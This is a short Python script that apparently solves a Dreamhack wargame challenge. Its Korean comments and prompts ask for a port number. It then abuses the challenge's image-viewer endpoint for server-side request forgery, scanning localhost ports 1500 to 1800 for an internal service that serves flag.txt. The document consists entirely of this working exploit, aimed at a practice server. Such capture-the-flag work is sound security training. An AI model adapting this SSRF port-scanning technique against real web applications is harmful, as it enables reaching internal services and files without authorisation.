# Wargame site URL: https://dreamhack.io/wargame/challenges/75

#!/usr/bin/python3
import requests
import sys

#열려있지 않은 포트로 flag.txt에 접근한 경우
error = "iVBORw0KG"

print("포트 번호를 입력하세요: ",end="")
pt=int(input())

url='http://host3.dreamhack.games:'+str(pt)+'/img_viewer'

for port in range(1500,1801):
    img_url='http://Localhost:'+str(port)+'/flag.txt'
    data={"url":img_url}
    resp=requests.post(url,data).text

    if error in resp:
        print(str(port))
    else:
        print(str(port),'success')
        break
